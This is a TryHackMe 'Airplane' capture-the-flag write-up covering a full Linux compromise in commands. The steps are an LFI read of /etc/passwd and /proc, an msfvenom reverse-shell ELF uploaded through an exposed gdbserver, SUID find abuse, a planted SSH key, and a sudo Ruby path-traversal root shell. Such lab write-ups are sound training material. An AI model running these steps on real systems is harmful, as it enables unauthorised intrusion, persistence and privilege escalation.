---
date: 2024-12-11T17:41:30-06:00
# description: ""
image: "/images/THM-Airplane/Airplane.svg"
showTableOfContents: true
tags: ["TryHackMe"]
categories: ["Writeups"]
title: "THM: Airplane"
type: "post"
---

* Platform: TryHackMe
* Link: [Airplane](https://tryhackme.com/r/room/airplane)
* Level: Medium
* OS: Linux
---

The challenge Airplane begins by uncovering a Local File Inclusion (LFI) vulnerability. By exploiting it, we enumerate the target’s running processes and identify one linked to `GdbServer`. Using an ELF binary crafted with msfvenom, we exploit this tool to gain an initial foothold on the system. Further enumeration reveals a binary with the SUID bit set, enabling us to pivot to another user and retrieve the user flag. We then access the system via SSH as the new user and discover permissions to execute Ruby scripts as the root user. By creating and running a malicious Ruby script, we escalate privileges and obtain root access.

## Scanning

```
./nmap_scan.sh 10.10.14.32 Airplane
```

**Results**

```shell
Running detailed scan on open ports: 22,6048,8000
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-11 17:48 CST
Nmap scan report for 10.10.14.32
Host is up (0.21s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b8:64:f7:a9:df:29:3a:b5:8a:58:ff:84:7c:1f:1a:b7 (RSA)
|   256 ad:61:3e:c7:10:32:aa:f1:f2:28:e2:de:cf:84:de:f0 (ECDSA)
|_  256 a9:d8:49:aa:ee:de:c4:48:32:e4:f1:9e:2a:8a:67:f0 (ED25519)
6048/tcp open  x11?
8000/tcp open  http-alt Werkzeug/3.0.2 Python/3.8.10
|_http-title: Did not follow redirect to http://airplane.thm:8000/?page=index.html
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/3.0.2 Python/3.8.10
|     Date: Wed, 11 Dec 2024 23:48:23 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/3.0.2 Python/3.8.10
|     Date: Wed, 11 Dec 2024 23:48:17 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 269
|     Location: http://airplane.thm:8000/?page=index.html
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="http://airplane.thm:8000/?page=index.html">http://airplane.thm:8000/?page=index.html</a>. If not, click the link.
|   Socks5: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('
|     ').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-server-header: Werkzeug/3.0.2 Python/3.8.10
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.94SVN%I=7%D=12/11%Time=675A24C2%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,1F3,"HTTP/1\.1\x20302\x20FOUND\r\nServer:\x20Werkzeug/3\.0
SF:\.2\x20Python/3\.8\.10\r\nDate:\x20Wed,\x2011\x20Dec\x202024\x2023:48:1
SF:7\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Len
SF:gth:\x20269\r\nLocation:\x20http://airplane\.thm:8000/\?page=index\.htm
SF:l\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\
SF:n<title>Redirecting\.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x
SF:20should\x20be\x20redirected\x20automatically\x20to\x20the\x20target\x2
SF:0URL:\x20<a\x20href=\"http://airplane\.thm:8000/\?page=index\.html\">ht
SF:tp://airplane\.thm:8000/\?page=index\.html</a>\.\x20If\x20not,\x20click
SF:\x20the\x20link\.\n")%r(FourOhFourRequest,184,"HTTP/1\.1\x20404\x20NOT\
SF:x20FOUND\r\nServer:\x20Werkzeug/3\.0\.2\x20Python/3\.8\.10\r\nDate:\x20
SF:Wed,\x2011\x20Dec\x202024\x2023:48:23\x20GMT\r\nContent-Type:\x20text/h
SF:tml;\x20charset=utf-8\r\nContent-Length:\x20207\r\nConnection:\x20close
SF:\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\n<title>404\x20Not\x20Fou
SF:nd</title>\n<h1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x2
SF:0not\x20found\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x
SF:20URL\x20manually\x20please\x20check\x20your\x20spelling\x20and\x20try\
SF:x20again\.</p>\n")%r(Socks5,213,"<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3
SF:C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x20\x20\"http:/
SF:/www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x20\x20<head>\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Content-Type\"\x2
SF:0content=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20
SF:\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\
SF:n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20
SF:\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20syntax\x20\('\
SF:\x05\\x04\\x00\\x01\\x02\\x80\\x05\\x01\\x00\\x03'\)\.</p>\n\x20\x20\x2
SF:0\x20\x20\x20\x20\x20<p>Error\x20code\x20explanation:\x20HTTPStatus\.BA
SF:D_REQUEST\x20-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20meth
SF:od\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 181.28 seconds
```

Our nmap scan discover three open ports:
* 22 - SSH
* 6048 - nmap is not able to accurately determine the service on this port
* 8000 - A web server with Python Werkzeug. We also have a redirection to `airplane.thm` which we add to the `/etc/hosts` file.

## Enumeration

Browsing to the website lead us to `http://airplane.thm:8000/?page=index.html` where we find a static website with various information about airplanes. We also note the presence of `?page=index.html` possibly pointing to an LFI vulnerability if security controls are lacking.

![Airplane website](/images/THM-Airplane/airplane_website.png)

In Burp we confirm the presence of the LFI vulnerability.

![LFI confirmed](/images/THM-Airplane/LFI_confirmed.png)

We can read the `/etc/passwd` to find out the users on the target system.

![user accounts](/images/THM-Airplane/users_list.png)

Here is the full content of the `/etc/passwd` file, we notice two user accounts `carlos` and `hudson`.

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:117:123::/var/lib/saned:/usr/sbin/nologin
nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false
whoopsie:x:120:125::/nonexistent:/bin/false
colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
fwupd-refresh:x:122:127:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
geoclue:x:123:128::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:124:129:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:126:131:Gnome Display Manager:/var/lib/gdm3:/bin/false
sssd:x:127:132:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
carlos:x:1000:1000:carlos,,,:/home/carlos:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
hudson:x:1001:1001::/home/hudson:/bin/bash
sshd:x:128:65534::/run/sshd:/usr/sbin/nologin
```

Trying to read the `user.txt` file in the home folder of `carlos` or `hudson` fails. 

![carlos Home folder](/images/THM-Airplane/carlos_home_folder.png)

![hudson home fodler](/images/THM-Airplane/hudson_home_folder.png)

Let's continue our enumeration with some directory bruteforcing.

![directory bruteforcing with Gobuster](/images/THM-Airplane/gobuster_cmd.png)

At `http://airplane.thm:8000/airplane` we find an animation with the message "Let's Fly", this is probably not a viable exploitation path. Additionally, the subdomain enumeration does not give any results.

![airplane directory](/images/THM-Airplane/letsfly.png)

We can leverage the LFI vulnerability to find information about the processes running on the target. Each process running on a Linux system has a corresponding directory under the `/proc` filesystem, and within that directory there is a file named `cmdline`. 

For example `/proc/100/cmdline` will contain the command-line arguments that were used to start the process with PID `100`. These file can contain sensitive information such as passwords, API keys, etc.

In order to enumerate the processes on the target, we use the Intruder feature in Burp. We use the payload `../../../../proc/x/cmdline` with the section sign around the `x`. 

![payload in intruder](/images/THM-Airplane/payload_intruder.png)

For the payload settings we select `Numbers` going sequentially from 1 to 10000 (You can pick a smaller number like 1000) and start the attack. Because of the rate limit in Burp CE, the process will take a long time but we can continue our enumeration as the attack progresses.

> I recommend using [Caido](https://caido.io/) for this type of attack because it does not have the rate limit issue.

After sorting by length, you will find a request with the response being `/usr/bin/gdbserver0.0.0.0:6048airplane`. (The specific request is always found among those with a length of approximately 400 bytes)

![gdbserver process](/images/THM-Airplane/gdbserver.png)

## Initial Foothold (shell as hudson)

Searching `gdbserver reverse shell` on Google, we find [this HackTricks page](https://book.hacktricks.xyz/network-services-pentesting/pentesting-remote-gdbserver) explaining how to exploit this tool. Let's follow the steps:

1. Create an elf backdoor

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP_ADDRESS LPORT=PORT PrependFork=true -f elf -o binary.elf
```

![elf backdoor](/images/THM-Airplane/elf_backdoor.png)

2. Make it executable

```
chmod +x binary.elf
```

3. Launch GDB to debug the executable

```
gdb binary.elf
```

![Open the elf with GDB](/images/THM-Airplane/gdb_elf.png)

4. Set the remote debuger target

```
target extended-remote airplane.thm:6048
```

![Set the remote target](/images/THM-Airplane/elf_target_set.png)

5. Upload the elf file

```
remote put binary.elf /tmp/binary.elf
```

![elf backdoor upload](/images/THM-Airplane/elf_upload.png)

6. Set the remote executable file

```
set remote exec-file /tmp/binary.elf
```

7. Execute the reverse shell executable

> Make sure your listener is set to the port number you decided in step 1

```
run
y
```

![Reverse shell executed](/images/THM-Airplane/revshell_executed.png)

On the listener we receive a connection as `hudson`.

![Foothold](/images/THM-Airplane/foothold.png)

We upgrade our shell with the following commands

```
python3 -c 'import pty;pty.spawn("/bin/bash")'  
export TERM=xterm  
ctrl + z  
stty raw -echo; fg
stty rows 38 columns 116
```

![Shell Upgrade](/images/THM-Airplane/shell_upgrade.png)

The user flag is not on this account, so we have to move to the second account. 

### Lateral Movement (shell as carlos)

We run linpeas and find that `/usr/bin/find` has the SUID bit set and it is owned by `carlos`.

![find binary with SUID bit set](/images/THM-Airplane/find_binary.png)

On [GTFObins](https://gtfobins.github.io/gtfobins/find/) we find a payload to escalate our privileges and the user flag is in `/home/carlos`.

```
/usr/bin/find . -exec /bin/bash -p \; -quit
```

![user flag](/images/THM-Airplane/user_flag.png)

With `ls -la` we notice the `.ssh` directory. We can add an ssh key to `/home/carlos/.ssh/authorized_keys` to be able to login via SSH as `carlos`.

We generate a key pair with 

```
ssh-keygen -t rsa -b 2048 -f carlos
```

![SSH keygen](/images/THM-Airplane/keygen_carlos.png)

We store the content of `carlos.pub` in `/home/carlos/.ssh/authorized_keys` using 

```
echo 'CONTENT OF carlos.pub' > /home/carlos/.ssh/authorized_keys

chmod 600 /home/carlos/.ssh/authorized_keys
```

![SSH setup](/images/THM-Airplane/SSH_setup.png)

On our local machine we login as carlos with 

```
ssh -i carlos carlos@airplane.thm
```

![SSH login as carlos](/images/THM-Airplane/shh_login_carlos.png)

## Privilege Escalation

With `sudo -l` we learn that `carlos` is allowed to run any Ruby script located in `/root` as the root user without providing a password.

![sudo -l command](/images/THM-Airplane/sudo-l.png)

This is easily abused by creating our own ruby file containing a command to spawn a shell, moreover because the wildcard `*` we can execute our file even if it is outside of `/root`.

```
echo 'exec "/bin/sh"' > root.rb

sudo /usr/bin/ruby /root/../home/carlos/root.rb
```

After executing the two commands above, we gain access to the root account and can read the `root.txt` file.

![root flag](/images/THM-Airplane/root_flag.png)

Thank you for taking the time to read this write up, I hope you found it useful.
